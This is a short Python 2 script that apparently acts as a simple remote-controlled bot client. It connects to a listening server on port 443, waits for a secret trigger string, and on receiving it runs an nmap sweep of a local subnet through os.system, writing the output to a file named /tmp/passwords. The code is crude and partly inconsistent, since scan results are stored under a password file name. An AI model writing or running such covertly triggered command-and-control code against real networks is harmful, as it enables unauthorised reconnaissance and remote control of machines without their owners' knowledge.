import os
import sys
import socket
import time

host = "127.0.0.1"
port = 443


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))


def scan_network():
    s.send("[+] Scanning")
    os.system("nmap -sn 192.168.0.1/24 -oN /tmp/passwords")
    print "Exiting"


while True:
    time.sleep(1)
    srv_cmd = s.recv(1024)
    if srv_cmd == "9j3b3k8":
        scan_network()
        srv_cmd = ""
        break
